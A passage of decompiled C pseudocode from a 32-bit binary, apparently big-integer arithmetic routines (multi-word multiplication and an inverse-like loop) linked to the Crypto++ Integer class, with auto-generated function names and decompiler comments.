  if ( v9 < v10 )
    v5 = v9;
  v12 = 1;
  memset(Block, 0, 4 * v5);
  if ( v5 )
    j_j_unknown_libname_61(v6);
  else
    j_j___free_base(v6);
  return v4;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 43E890: using guessed type _DWORD var_24[2];

//----- (0043E930) --------------------------------------------------------
_DWORD *__thiscall sub_43E930(_DWORD *this, _DWORD *Block, int a3)
{
  int v4; // eax
  _DWORD *v6; // ebx
  unsigned int v7; // edx
  int v8; // eax
  int v9; // esi
  int v10; // eax
  void *v11; // [esp-4h] [ebp-38h]
  _DWORD v12[2]; // [esp+10h] [ebp-24h] BYREF
  unsigned int v13; // [esp+18h] [ebp-1Ch]
  unsigned int v14; // [esp+1Ch] [ebp-18h]
  void *v15; // [esp+20h] [ebp-14h]
  int v16; // [esp+30h] [ebp-4h]

  v4 = this[6];
  if ( Block[3] != v4 || *(_DWORD *)(a3 + 12) != v4 )
  {
    sub_443C50(Block, v12, a3);
    v16 = 0;
    v6 = this + 15;
    sub_43DBB0(this + 15, v12);
    v7 = v14;
    if ( v13 < v14 )
      v7 = v13;
    v11 = v15;
    v16 = 1;
    memset(v15, 0, 4 * v7);
    if ( v7 )
      j_j_unknown_libname_61(v11);
    else
      j_j___free_base(v11);
    v8 = this[8];
    v9 = (int)(this + 3);
    v16 = -1;
    if ( v6[5] == 1 )
    {
      if ( v8 != 1 )
        return v6;
      v10 = -sub_443E50(v6, v9);
    }
    else
    {
      if ( v8 == 1 )
      {
LABEL_18:
        sub_43E460((int)v6, v9);
        return v6;
      }
      v10 = sub_443E50(v6, v9);
    }
    if ( v10 >= 0 )
      goto LABEL_18;
    return v6;
  }
  if ( off_4E802C(Block[4], *(_DWORD *)(a3 + 16)) || sub_440EF0(this[13], this[7], Block[3]) >= 0 )
    off_4E8030(this[13], this[7]);
  return this + 9;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);
// 43E930: using guessed type _DWORD var_24[2];

//----- (0043EA70) --------------------------------------------------------
int __cdecl sub_43EA70(_DWORD *a1, _DWORD *a2, char *a3, int a4, char *a5, unsigned int a6)
{
  unsigned int v6; // ebp
  _DWORD *v7; // ebx
  char *v8; // edi
  char *v9; // eax
  int v10; // esi
  unsigned int v11; // eax
  unsigned int v12; // ebx
  char *v13; // ecx
  char *v14; // edx
  unsigned int v15; // esi
  unsigned int v16; // ecx
  unsigned int v17; // esi
  unsigned int v18; // eax
  int *v19; // edx
  int v20; // ecx
  int v21; // edx
  int v22; // esi
  unsigned int v23; // ecx
  char *v24; // eax
  int v26; // edi
  char *v27; // esi
  unsigned int v28; // edx
  unsigned int v29; // esi
  unsigned int v30; // edi
  char v31; // bp
  unsigned int v32; // edx
  unsigned int v33; // ecx
  char *v34; // eax
  char *v35; // esi
  unsigned int v36; // esi
  int v37; // eax
  bool v38; // zf
  int v39; // eax
  int v40; // eax
  int v41; // eax
  char v42; // [esp+13h] [ebp-21h]
  unsigned int v43; // [esp+14h] [ebp-20h]
  unsigned int v44; // [esp+14h] [ebp-20h]
  char *v45; // [esp+18h] [ebp-1Ch]
  char *v46; // [esp+1Ch] [ebp-18h]
  unsigned int v47; // [esp+20h] [ebp-14h]
  int v48; // [esp+24h] [ebp-10h]
  _DWORD *v49; // [esp+28h] [ebp-Ch]
  char v50; // [esp+30h] [ebp-4h]
  int v51; // [esp+40h] [ebp+Ch]
  char v52; // [esp+40h] [ebp+Ch]

  v6 = a6;
  v43 = 2;
  v47 = a6;
  v7 = &a2[a6];
  v49 = v7;
  v8 = (char *)&a2[2 * a6];
  v45 = v8;
  v46 = (char *)&a2[3 * a6];
  if ( a6 )
  {
    v9 = &a5[4 * a6 - 4];
    do
    {
      if ( *((_DWORD *)v9 - 1) )
        break;
      if ( *(_DWORD *)v9 )
        break;
      v9 -= 8;
      v6 -= 2;
    }
    while ( v6 );
    v47 = v6;
  }
  v10 = 0;
  v42 = 0;
  v48 = 0;
  if ( 3 * a6 )
  {
    memset(a2, 0, 12 * a6);
    v8 = (char *)&a2[2 * a6];
  }
  *a2 = 1;
  if ( v8 != a3 )
    sub_438F30(v8, 4 * a4, a3, 4 * a4);
  if ( v46 != a5 )
    sub_438F30(v46, 4 * a6, a5, 4 * a6);
  while ( 1 )
  {
    v11 = *(_DWORD *)v8;
    if ( !*(_DWORD *)v8 )
      break;
LABEL_26:
    _BitScanForward((unsigned int *)&v21, v11);
    v51 = v21;
    v22 = v21 + v10;
    v48 = v22;
    if ( v11 >> v21 == 1 && !*((_DWORD *)v8 + 1) )
    {
      v23 = v6 - 2;
      if ( v6 == 2 )
      {
LABEL_33:
        if ( v42 )
        {
          off_4E8030((int)a5, (int)a2);
          return v22;
        }
        else
        {
          if ( a1 != a2 )
            sub_438F30(a1, 4 * a6, a2, 4 * a6);
          return v22;
        }
      }
      v24 = &v8[4 * v23 + 4];
      while ( !*((_DWORD *)v24 - 1) && !*(_DWORD *)v24 )
      {
        v24 -= 8;
        v23 -= 2;
        if ( !v23 )
          goto LABEL_33;
      }
    }
    v26 = 0;
    if ( v21 && v6 )
    {
      v50 = 32 - v21;
      v27 = &v45[4 * v6 - 4];
      do
      {
        v28 = *(_DWORD *)v27;
        v27 -= 4;
        *((_DWORD *)v27 + 1) = v26 | (v28 >> v51);
        v26 = v28 << v50;
        --v6;
      }
      while ( v6 );
      v6 = v47;
      v7 = v49;
      v21 = v51;
    }
    v29 = 0;
    if ( v21 )
    {
      v30 = 0;
      if ( v43 )
      {
        v31 = v51;
        v52 = 32 - v51;
        do
        {
          v32 = v7[v30];
          v7[v30++] = v29 | (v32 << v31);
          v29 = v32 >> v52;
        }
        while ( v30 < v43 );
        v6 = v47;
      }
    }
    v33 = v6;
    v7[v43] += v29;
    v44 = (v29 != 0 ? 2 : 0) + v43;
    if ( v6 )
    {
      v34 = &v45[4 * v6];
      v35 = (char *)(v46 - v45);
      while ( 1 )
      {
        v36 = *(_DWORD *)&v34[(_DWORD)v35 - 4];
        v34 -= 4;
        --v33;
        if ( *(_DWORD *)v34 > v36 )
          break;
        if ( *(_DWORD *)v34 < v36 )
        {
          v37 = -1;
          goto LABEL_51;
        }
        v35 = (char *)(v46 - v45);
        if ( !v33 )
          goto LABEL_50;
      }
      v37 = 1;
    }
    else
    {
LABEL_50:
      v37 = 0;
    }
LABEL_51:
    v38 = v37 == -1;
    v42 ^= v38;
    v39 = 4 * v38 * ((v45 - v46) >> 2);
    v8 = &v45[-v39];
    v46 += v39;
    v45 = v8;
    v40 = 4 * v38 * (a2 - v7);
    v7 = (_DWORD *)((char *)v7 + v40);
    a2 = (_DWORD *)((char *)a2 - v40);
    v49 = v7;
    v6 -= *(_QWORD *)&v8[4 * v6 - 8] != 0i64 ? 0 : 2;
    v47 = v6;
    off_4E8030((int)v8, (int)v46);
    v41 = off_4E802C(a2, v7);
    a2[v44] += v41;
    v43 = v44 + 2 * v41;
    v10 = v48;
  }
  while ( sub_441CD0((int)v8, v6) )
  {
    v12 = v6 != 0;
    if ( v6 )
    {
      if ( v12 < v6 )
      {
        v13 = v8;
        v14 = &v8[4 * v12];
        v15 = v6 != 0;
        do
        {
          v13 += 4;
          ++v15;
          *((_DWORD *)v13 - 1) = *(_DWORD *)v14;
          v14 += 4;
        }
        while ( v15 < v6 );
      }
      memset(&v8[4 * (v6 - v12)], 0, 4 * v12);
      v8 = v45;
    }
    v7 = v49;
    v16 = (v49[v43 - 1] != 0 ? 2 : 0) + v43;
    v43 = v16;
    v17 = v16 != 0;
    if ( v16 )
    {
      v18 = v16 - 1;
      if ( v16 - 1 >= v17 )
      {
        v19 = &v49[v18 - v17];
        do
        {
          v20 = *v19--;
          v49[v18--] = v20;
        }
        while ( v18 >= v17 );
      }
      memset(v49, 0, 4 * v17);
      v8 = v45;
    }
    v11 = *(_DWORD *)v8;
    v10 = v48 + 32;
    v48 += 32;
    if ( *(_DWORD *)v8 )
      goto LABEL_26;
  }
  if ( a6 )
    memset(a1, 0, 4 * ((4 * a6) >> 2));
  return 0;
}
// 43EB99: conditional instruction was optimized away because ebp.4!=0
// 43EBEF: conditional instruction was optimized away because esi.4!=0
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);
// 4E8030: using guessed type int (__stdcall *off_4E8030)(int, int);

//----- (0043EE60) --------------------------------------------------------
char __cdecl sub_43EE60(int a1, _DWORD *a2, unsigned int *a3)
{
  unsigned int v4; // edx
  void *v5; // esi
  _DWORD v6[2]; // [esp+Ch] [ebp-24h] BYREF
  unsigned int v7; // [esp+14h] [ebp-1Ch]
  unsigned int v8; // [esp+18h] [ebp-18h]
  void *Block; // [esp+1Ch] [ebp-14h]
  int v10; // [esp+2Ch] [ebp-4h]

  if ( __std_type_info_compare(a1 + 4, &dword_4E9290) )
    return 0;
  sub_43D500(v6, *a3);
  v10 = 0;
  sub_43DBB0(a2, v6);
  v4 = v8;
  v5 = Block;
  if ( v7 < v8 )
    v4 = v7;
  v10 = 1;
  memset(Block, 0, 4 * v4);
  if ( v4 )
    j_j_unknown_libname_61(v5);
  else
    j_j___free_base(v5);
  return 1;
}
// 45AC70: using guessed type _DWORD __cdecl j_j_unknown_libname_61(_DWORD);
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4E9290: using guessed type int dword_4E9290;
// 43EE60: using guessed type _DWORD var_24[2];

//----- (0043EF20) --------------------------------------------------------
char __thiscall sub_43EF20(unsigned int *this, void *a2, int a3, unsigned int *a4)
{
  unsigned int v5; // eax

  if ( __std_type_info_compare(&dword_4E98E8, &dword_4EE1D8) || (LOBYTE(v5) = sub_43EE60(a3, a4, this + 4), !(_BYTE)v5) )
  {
    sub_4059C0(a2, (int)&enum CryptoPP::Integer::RandomNumberType `RTTI Type Descriptor', a3);
    v5 = this[4];
    *a4 = v5;
  }
  return v5;
}
// 48384F: using guessed type _DWORD __cdecl __std_type_info_compare(_DWORD, _DWORD);
// 4E98E8: using guessed type int dword_4E98E8;
// 4EE1D8: using guessed type int dword_4EE1D8;

//----- (0043EF80) --------------------------------------------------------
unsigned int __cdecl sub_43EF80(_BYTE *a1, int a2, int a3, unsigned int a4, int a5, unsigned int a6)
{
  unsigned int v6; // esi
  unsigned int v7; // edi
  unsigned int result; // eax
  _BYTE *v9; // ecx
  unsigned int *v10; // ebx
  unsigned int v11; // ebx
  _BYTE *v12; // esi
  unsigned int v13; // ebp
  int v14; // ecx
  unsigned int v15; // eax
  unsigned __int64 v16; // rax
  int v17; // edx
  int v18; // eax
  int v19; // eax
  int v20; // ecx
  int v21; // edx
  int v22; // eax
  int v23; // edx
  int v24; // ecx
  unsigned int v25; // ecx
  _DWORD *v26; // edx
  char *v28; // [esp+8h] [ebp-Ch]
  unsigned int v29; // [esp+Ch] [ebp-8h]
  int v30; // [esp+Ch] [ebp-8h]
  int v31; // [esp+Ch] [ebp-8h]
  int v32; // [esp+10h] [ebp-4h]
  _BYTE *v33; // [esp+10h] [ebp-4h]
  int v34; // [esp+10h] [ebp-4h]
  _BYTE *v35; // [esp+24h] [ebp+10h]
  unsigned int v36; // [esp+24h] [ebp+10h]
  int v37; // [esp+24h] [ebp+10h]
  int v38; // [esp+24h] [ebp+10h]
  int v39; // [esp+2Ch] [ebp+18h]
  unsigned int v40; // [esp+2Ch] [ebp+18h]
  unsigned int v41; // [esp+2Ch] [ebp+18h]
  unsigned int v42; // [esp+2Ch] [ebp+18h]

  v6 = a4;
  v7 = a6;
  if ( a4 == a6 )
  {
    if ( a3 == a5 )
      return sub_444AA0((int)a1, a2, a3, a4);
    else
      return sub_444810((int)a1, a2, a3, a5, a4);
  }
  else
  {
    if ( a4 <= a6 )
    {
      v9 = (_BYTE *)a5;
      v10 = (unsigned int *)a3;
    }
    else
    {
      v9 = (_BYTE *)a3;
      v10 = (unsigned int *)a5;
      v6 = a6;
      v7 = a4;
      a6 = a4;
    }
    v35 = v9;
    if ( v6 != 2 || v10[1] )
    {
      if ( ((v7 / v6) & 1) != 0 )
      {
        v41 = 0;
        if ( v7 )
        {
          v21 = (int)a1;
          v22 = v9 - a1;
          v33 = a1;
          v30 = v9 - a1;
          do
          {
            sub_444810(v21, a2, (int)v10, v21 + v22, v6);
            v21 = (int)&v33[8 * v6];
            v33 = (_BYTE *)v21;
            v41 += 2 * v6;
            v22 = v30;
          }
          while ( v41 < v7 );
        }
        v42 = v6;
        if ( v6 < v7 )
        {
          v34 = 8 * v6;
          v23 = a2 + 8 * v6;
          v31 = v23;
          v24 = (int)&v35[4 * v6];
          v38 = v24;
          do
          {
            sub_444810(v23, a2, (int)v10, v24, v6);
            v24 = v34 + v38;
            v23 = v34 + v31;
            v42 += 2 * v6;
            v38 += v34;
            v31 += v34;
          }
          while ( v42 < v7 );
        }
      }
      else
      {
        sub_444810((int)a1, a2, (int)v10, (int)v9, v6);
        v28 = &a1[4 * v6];
        if ( (char *)(a2 + 8 * v6) != v28 )
          sub_438F30((void *)(a2 + 8 * v6), 4 * v6, &a1[4 * v6], 4 * v6);
        v29 = 2 * v6;
        if ( 2 * v6 < v7 )
        {
          v17 = (int)&v35[8 * v6];
          v32 = v17;
          v18 = a2 + 12 * v6;
          v39 = v18;
          do
          {
            sub_444810(v18, a2, (int)v10, v17, v6);
            v39 += 8 * v6;
            v17 = 8 * v6 + v32;
            v32 = v17;
            v29 += 2 * v6;
            v18 = v39;
          }
          while ( v29 < v7 );
        }
        v40 = v6;
        if ( v6 < v7 )
        {
          v19 = v35 - a1;
          v20 = (int)&a1[4 * v6];
          v37 = v35 - a1;
          do
          {
            sub_444810(v20, a2, (int)v10, v20 + v19, v6);
            v20 = (int)&v28[8 * v6];
            v28 = (char *)v20;
            v40 += 2 * v6;
            v19 = v37;
          }
          while ( v40 < v7 );
        }
      }
      result = off_4E802C(&a1[4 * v6], a2 + 8 * v6);
      if ( result )
      {
        v25 = *(_DWORD *)&a1[4 * v7];
        v26 = &a1[4 * v7];
        result = v25 + 1;
        *v26 = v25 + 1;
        if ( v25 + 1 < v25 )
        {
          for ( result = 1; result < v6; ++result )
          {
            if ( v26[result]++ != -1 )
              break;
          }
        }
      }
    }
    else
    {
      result = *v10;
      v36 = *v10;
      if ( *v10 )
      {
        if ( result == 1 )
        {
          result = sub_441010(a1, v9, v7);
          *(_DWORD *)&a1[4 * v7 + 4] = 0;
          *(_DWORD *)&a1[4 * v7] = 0;
        }
        else
        {
          v11 = 0;
          if ( v7 )
          {
            v12 = a1;
            v13 = v7;
            v14 = v9 - a1;
            do
            {
              v15 = *(_DWORD *)&v12[v14];
              v12 += 4;
              v16 = v36 * (unsigned __int64)v15;
              *((_DWORD *)v12 - 1) = v11 + v16;
              v11 = (v16 + v11) >> 32;
              --v13;
            }
            while ( v13 );
            v7 = a6;
          }
          result = (unsigned int)a1;
          *(_DWORD *)&a1[4 * v7] = v11;
          *(_DWORD *)&a1[4 * v7 + 4] = 0;
        }
      }
      else if ( v7 != -2 )
      {
        result = 0;
        memset(a1, 0, 4 * (v7 + 2));
      }
    }
  }
  return result;
}
// 4E802C: using guessed type int (__stdcall *off_4E802C)(_DWORD, _DWORD);

//----- (0043F2B0) --------------------------------------------------------
void __thiscall sub_43F2B0(void *this, int a2)
{
  int v3; // ecx
  unsigned int v4; // ebx
  int v5; // esi
  unsigned __int64 v6; // rax
  int v7[6]; // [esp+10h] [ebp-38h] BYREF
  unsigned int v8; // [esp+28h] [ebp-20h]
  int v9; // [esp+2Ch] [ebp-1Ch]
  char v10; // [esp+31h] [ebp-17h]
  int v11; // [esp+44h] [ebp-4h]

  sub_432B70(v7, a2, 2);
  v11 = 0;
  if ( !v10 || (v4 = v8, v5 = v9, LODWORD(v6) = sub_4375E0(v7), v6 < __PAIR64__(v5, v4)) )
    sub_433790(v3);
  sub_441170((int)this, (int)v7, v8, 1);
  sub_434210((int)v7);
  sub_432C40(v7);
}
// 43F30E: variable 'v6' is possibly undefined
// 43F34E: variable 'v3' is possibly undefined
// 433790: using guessed type void __fastcall __noreturn sub_433790(_DWORD);
// 43F2B0: using guessed type int var_38[6];

//----- (0043F360) --------------------------------------------------------
unsigned __int64 __cdecl sub_43F360(int a1, unsigned int *a2, unsigned int *a3)
{
  unsigned int v3; // ecx
  unsigned __int64 v4; // kr08_8
  unsigned __int64 v5; // kr10_8
  unsigned __int64 result; // rax

  v3 = (*a3 * (unsigned __int64)*a2) >> 32;
  *(_DWORD *)a1 = *a3 * *a2;
  v4 = v3 + a3[1] * (unsigned __int64)*a2;
  v5 = *a3 * (unsigned __int64)a2[1] + (unsigned int)v4;
  *(_DWORD *)(a1 + 4) = v5;
  result = HIDWORD(v4) + HIDWORD(v5) + a3[1] * (unsigned __int64)a2[1];
  *(_QWORD *)(a1 + 8) = result;
  return result;
}

//----- (0043F3C0) --------------------------------------------------------
unsigned __int64 __cdecl sub_43F3C0(int a1, unsigned int *a2, unsigned int *a3)
{
  unsigned int v3; // ecx
  unsigned __int64 v4; // kr08_8
  unsigned __int64 v5; // kr30_8
  unsigned __int64 v6; // kr48_8
  unsigned __int64 v7; // rax
  unsigned __int64 v8; // kr50_8
  unsigned int v9; // esi
  unsigned __int64 v10; // kr60_8
  int v11; // esi
  unsigned __int64 v12; // kr70_8
  unsigned __int64 v13; // kr88_8
  unsigned __int64 v14; // rax
  unsigned __int64 v15; // kr90_8
  unsigned __int64 v16; // krA0_8
  unsigned __int64 result; // rax

  v3 = (*a3 * (unsigned __int64)*a2) >> 32;
  *(_DWORD *)a1 = *a3 * *a2;
  v4 = a3[1] * (unsigned __int64)*a2 + v3;
  v5 = (((unsigned int)v4 + *a3 * (unsigned __int64)a2[1]) >> 32) + HIDWORD(v4);
  *(_DWORD *)(a1 + 4) = v4 + *a3 * a2[1];
  v6 = ((a3[1] * (unsigned __int64)a2[1] + a3[2] * *a2 + (unsigned int)v5) >> 32)
     + ((a3[2] * (unsigned __int64)*a2 + (unsigned int)v5) >> 32)
     + HIDWORD(v5);
  v7 = *a3 * (unsigned __int64)a2[2] + a3[1] * a2[1] + a3[2] * *a2 + (_DWORD)v5;
  *(_DWORD *)(a1 + 8) = v7;
  v8 = HIDWORD(v7) + v6;
  v9 = a3[3] * *a2 + v8;
  v10 = ((a3[2] * (unsigned __int64)a2[1] + v9) >> 32)
      + ((a3[3] * (unsigned __int64)*a2 + (unsigned int)v8) >> 32)
      + HIDWORD(v8);
  HIDWORD(v7) = (a3[1] * (unsigned __int64)a2[2] + a3[2] * a2[1] + v9) >> 32;
  v11 = a3[1] * a2[2] + a3[2] * a2[1] + v9;
  v12 = HIDWORD(v7) + v10 + (((unsigned int)v11 + *a3 * (unsigned __int64)a2[3]) >> 32);
  *(_DWORD *)(a1 + 12) = v11 + *a3 * a2[3];
  v13 = ((a3[2] * (unsigned __int64)a2[2] + a3[3] * a2[1] + (unsigned int)v12) >> 32)
      + ((a3[3] * (unsigned __int64)a2[1] + (unsigned int)v12) >> 32)
      + HIDWORD(v12);
  v14 = a3[1] * (unsigned __int64)a2[3] + a3[2] * a2[2] + a3[3] * a2[1] + (_DWORD)v12;
  *(_DWORD *)(a1 + 16) = v14;
  v15 = HIDWORD(v14) + v13;
  HIDWORD(v14) = ((unsigned int)v15 + a3[3] * (unsigned __int64)a2[2]) >> 32;
  v16 = a3[2] * (unsigned __int64)a2[3] + (unsigned int)v15 + a3[3] * a2[2];
  *(_DWORD *)(a1 + 20) = v16;
  result = HIDWORD(v14) + (unsigned __int64)HIDWORD(v15) + a3[3] * (unsigned __int64)a2[3] + HIDWORD(v16);
  *(_QWORD *)(a1 + 24) = result;
  return result;
}

//----- (0043F530) --------------------------------------------------------
unsigned __int64 __cdecl sub_43F530(_DWORD *a1, unsigned int *a2, unsigned int *a3)
{
  int v3; // ecx
  unsigned int v4; // kr00_4
  __int64 v5; // kr08_8
  unsigned __int64 v6; // kr18_8
  unsigned __int64 v7; // kr20_8
  unsigned __int64 v8; // kr40_8
  unsigned __int64 v9; // rax
  unsigned __int64 v10; // kr48_8
  unsigned int v11; // esi
  unsigned __int64 v12; // rax
  unsigned __int64 v13; // kr78_8
  unsigned int v14; // esi
  unsigned __int64 v15; // krA8_8
  unsigned __int64 v16; // rax
  unsigned __int64 v17; // krB0_8
  unsigned int v18; // esi
  unsigned __int64 v19; // kr100_8
  unsigned int v20; // esi
  unsigned __int64 v21; // kr150_8
  unsigned __int64 v22; // rax
  unsigned __int64 v23; // kr158_8
  unsigned int v24; // esi
  unsigned __int64 v25; // kr1A8_8
  int v26; // esi
  unsigned __int64 v27; // kr1B8_8
  unsigned __int64 v28; // kr1F8_8
  unsigned int v29; // esi
  unsigned __int64 v30; // kr208_8
  unsigned __int64 v31; // rax
  unsigned __int64 v32; // kr210_8
  unsigned int v33; // esi
  unsigned __int64 v34; // kr240_8
  int v35; // esi
  unsigned __int64 v36; // kr250_8
  unsigned int v37; // esi
  unsigned __int64 v38; // kr280_8
  unsigned __int64 v39; // rax
  unsigned __int64 v40; // kr288_8
  unsigned int v41; // esi
  unsigned __int64 v42; // kr298_8
  int v43; // esi
  unsigned __int64 v44; // kr2A8_8
  unsigned __int64 v45; // kr2C8_8
  unsigned __int64 v46; // rax
  unsigned __int64 v47; // kr2D0_8
  unsigned int v48; // ebx
  unsigned int v49; // edi
  unsigned __int64 v50; // kr2E8_8
  unsigned __int64 v51; // rax
  int v52; // kr10_4
  unsigned __int64 result; // rax

  v4 = *a3;
  v5 = *a2;
  v3 = ((unsigned __int64)*a3 * v5) >> 32;
  *a1 = *a3 * *a2;
  v6 = a3[1] * (unsigned __int64)*a2;
  v7 = ((((__PAIR64__(a3[1], v4) * v5) >> 32) + *a3 * (unsigned __int64)a2[1]) >> 32)
     + (unsigned int)__CFADD__(v3, (_DWORD)v6)
     + HIDWORD(v6);
  a1[1] = ((__PAIR64__(a3[1], v4) * v5) >> 32) + *a3 * a2[1];
  v8 = (((unsigned int)v7 + a3[2] * *a2 + a3[1] * (unsigned __int64)a2[1]) >> 32)
     + (((unsigned int)v7 + a3[2] * (unsigned __int64)*a2) >> 32)
     + HIDWORD(v7);
  v9 = *a3 * (unsigned __int64)a2[2] + (_DWORD)v7 + a3[2] * *a2 + a3[1] * a2[1];
  a1[2] = v9;
  v10 = HIDWORD(v9) + v8;
  v11 = v10 + a3[3] * *a2;
  v12 = a3[1] * a2[2] + v11 + a3[2] * a2[1] + *a3 * (unsigned __int64)a2[3];
  v13 = HIDWORD(v12)
      + ((a3[1] * (unsigned __int64)a2[2] + v11 + a3[2] * a2[1]) >> 32)
      + ((v11 + a3[2] * (unsigned __int64)a2[1]) >> 32)
      + (((unsigned int)v10 + a3[3] * (unsigned __int64)*a2) >> 32)
      + HIDWORD(v10);
  a1[3] = v12;
  v14 = v13 + a3[4] * *a2 + a3[3] * a2[1] + a3[2] * a2[2];
  v15 = ((v14 + a3[1] * (unsigned __int64)a2[3]) >> 32)
      + (((_DWORD)v13 + a3[4] * *a2 + a3[3] * a2[1] + a3[2] * (unsigned __int64)a2[2]) >> 32)
      + (((unsigned int)v13 + a3[4] * *a2 + a3[3] * (unsigned __int64)a2[1]) >> 32)
      + (((unsigned int)v13 + a3[4] * (unsigned __int64)*a2) >> 32)
      + HIDWORD(v13);
  v16 = *a3 * (unsigned __int64)a2[4] + v14 + a3[1] * a2[3];
  a1[4] = v16;
  v17 = HIDWORD(v16) + v15;
  v18 = v17 + a3[5] * *a2 + a3[4] * a2[1] + a3[3] * a2[2] + a3[2] * a2[3] + a3[1] * a2[4];
  v19 = (((_DWORD)v17 + a3[5] * *a2 + a3[4] * a2[1] + a3[3] * a2[2] + a3[2] * a2[3] + a3[1] * (unsigned __int64)a2[4]) >> 32)
      + (((_DWORD)v17 + a3[5] * *a2 + a3[4] * a2[1] + a3[3] * a2[2] + a3[2] * (unsigned __int64)a2[3]) >> 32)
      + (((_DWORD)v17 + a3[5] * *a2 + a3[4] * a2[1] + a3[3] * (unsigned __int64)a2[2]) >> 32)
      + (((unsigned int)v17 + a3[5] * *a2 + a3[4] * (unsigned __int64)a2[1]) >> 32)
      + (((unsigned int)v17 + a3[5] * (unsigned __int64)*a2) >> 32)
      + HIDWORD(v17)
      + ((v18 + *a3 * (unsigned __int64)a2[5]) >> 32);
  a1[5] = v18 + *a3 * a2[5];
  v20 = a3[6] * *a2 + v19 + a3[5] * a2[1] + a3[4] * a2[2] + a3[3] * a2[3] + a3[2] * a2[4];
  v21 = ((v20 + a3[1] * (unsigned __int64)a2[5]) >> 32)
      + ((a3[6] * *a2 + (_DWORD)v19 + a3[5] * a2[1] + a3[4] * a2[2] + a3[3] * a2[3] + a3[2] * (unsigned __int64)a2[4]) >> 32)
      + ((a3[6] * *a2 + (_DWORD)v19 + a3[5] * a2[1] + a3[4] * a2[2] + a3[3] * (unsigned __int64)a2[3]) >> 32)
      + ((a3[6] * *a2 + (_DWORD)v19 + a3[5] * a2[1] + a3[4] * (unsigned __int64)a2[2]) >> 32)
      + ((a3[6] * *a2 + (unsigned int)v19 + a3[5] * (unsigned __int64)a2[1]) >> 32)
      + ((a3[6] * (unsigned __int64)*a2 + (unsigned int)v19) >> 32)
      + HIDWORD(v19);
  v22 = *a3 * (unsigned __int64)a2[6] + v20 + a3[1] * a2[5];
  a1[6] = v22;
  v23 = HIDWORD(v22) + v21;
  v24 = a3[7] * *a2 + v23 + a3[6] * a2[1] + a3[5] * a2[2] + a3[4] * a2[3] + a3[3] * a2[4];
  v25 = ((v24 + a3[2] * (unsigned __int64)a2[5]) >> 32)
      + ((a3[7] * *a2 + (_DWORD)v23 + a3[6] * a2[1] + a3[5] * a2[2] + a3[4] * a2[3] + a3[3] * (unsigned __int64)a2[4]) >> 32)
      + ((a3[7] * *a2 + (_DWORD)v23 + a3[6] * a2[1] + a3[5] * a2[2] + a3[4] * (unsigned __int64)a2[3]) >> 32)
      + ((a3[7] * *a2 + (_DWORD)v23 + a3[6] * a2[1] + a3[5] * (unsigned __int64)a2[2]) >> 32)
      + ((a3[7] * *a2 + (unsigned int)v23 + a3[6] * (unsigned __int64)a2[1]) >> 32)
      + ((a3[7] * (unsigned __int64)*a2 + (unsigned int)v23) >> 32)
      + HIDWORD(v23);
  HIDWORD(v22) = (a3[1] * (unsigned __int64)a2[6] + v24 + a3[2] * a2[5]) >> 32;
  v26 = a3[1] * a2[6] + v24 + a3[2] * a2[5];
  v27 = HIDWORD(v22) + v25 + (((unsigned int)v26 + *a3 * (unsigned __int64)a2[7]) >> 32);
  a1[7] = v26 + *a3 * a2[7];
  v28 = ((a3[7] * a2[1] + (_DWORD)v27 + a3[6] * a2[2] + a3[5] * a2[3] + a3[4] * (unsigned __int64)a2[4]) >> 32)
      + ((a3[7] * a2[1] + (_DWORD)v27 + a3[6] * a2[2] + a3[5] * (unsigned __int64)a2[3]) >> 32)
      + ((a3[7] * a2[1] + (unsigned int)v27 + a3[6] * (unsigned __int64)a2[2]) >> 32)
      + ((a3[7] * (unsigned __int64)a2[1] + (unsigned int)v27) >> 32)
      + HIDWORD(v27);
  v29 = a3[7] * a2[1] + v27 + a3[6] * a2[2] + a3[5] * a2[3] + a3[4] * a2[4] + a3[3] * a2[5];
  v30 = ((v29 + a3[2] * (unsigned __int64)a2[6]) >> 32)
      + ((a3[7] * a2[1] + (_DWORD)v27 + a3[6] * a2[2] + a3[5] * a2[3] + a3[4] * a2[4] + a3[3] * (unsigned __int64)a2[5]) >> 32)
      + v28;
  v31 = a3[1] * (unsigned __int64)a2[7] + v29 + a3[2] * a2[6];
  a1[8] = v31;
  v32 = HIDWORD(v31) + v30;
  v33 = v32 + a3[7] * a2[2] + a3[6] * a2[3] + a3[5] * a2[4];
  v34 = ((v33 + a3[4] * (unsigned __int64)a2[5]) >> 32)
      + (((_DWORD)v32 + a3[7] * a2[2] + a3[6] * a2[3] + a3[5] * (unsigned __int64)a2[4]) >> 32)
      + (((unsigned int)v32 + a3[7] * a2[2] + a3[6] * (unsigned __int64)a2[3]) >> 32)
      + (((unsigned int)v32 + a3[7] * (unsigned __int64)a2[2]) >> 32)
      + HIDWORD(v32);
  HIDWORD(v31) = (a3[3] * (unsigned __int64)a2[6] + v33 + a3[4] * a2[5]) >> 32;
  v35 = a3[3] * a2[6] + v33 + a3[4] * a2[5];
  v36 = HIDWORD(v31) + v34 + (((unsigned int)v35 + a3[2] * (unsigned __int64)a2[7]) >> 32);
  a1[9] = v35 + a3[2] * a2[7];
  v37 = v36 + a3[7] * a2[3] + a3[6] * a2[4] + a3[5] * a2[5];
  v38 = ((v37 + a3[4] * (unsigned __int64)a2[6]) >> 32)
      + (((_DWORD)v36 + a3[7] * a2[3] + a3[6] * a2[4] + a3[5] * (unsigned __int64)a2[5]) >> 32)
      + (((unsigned int)v36 + a3[7] * a2[3] + a3[6] * (unsigned __int64)a2[4]) >> 32)
      + (((unsigned int)v36 + a3[7] * (unsigned __int64)a2[3]) >> 32)
      + HIDWORD(v36);
  v39 = a3[3] * (unsigned __int64)a2[7] + v37 + a3[4] * a2[6];
  a1[10] = v39;
  v40 = HIDWORD(v39) + v38;
  v41 = v40 + a3[7] * a2[4];
  v42 = ((v41 + a3[6] * (unsigned __int64)a2[5]) >> 32)
      + (((unsigned int)v40 + a3[7] * (unsigned __int64)a2[4]) >> 32)
      + HIDWORD(v40);
  HIDWORD(v39) = (a3[5] * (unsigned __int64)a2[6] + v41 + a3[6] * a2[5]) >> 32;
  v43 = a3[5] * a2[6] + v41 + a3[6] * a2[5];
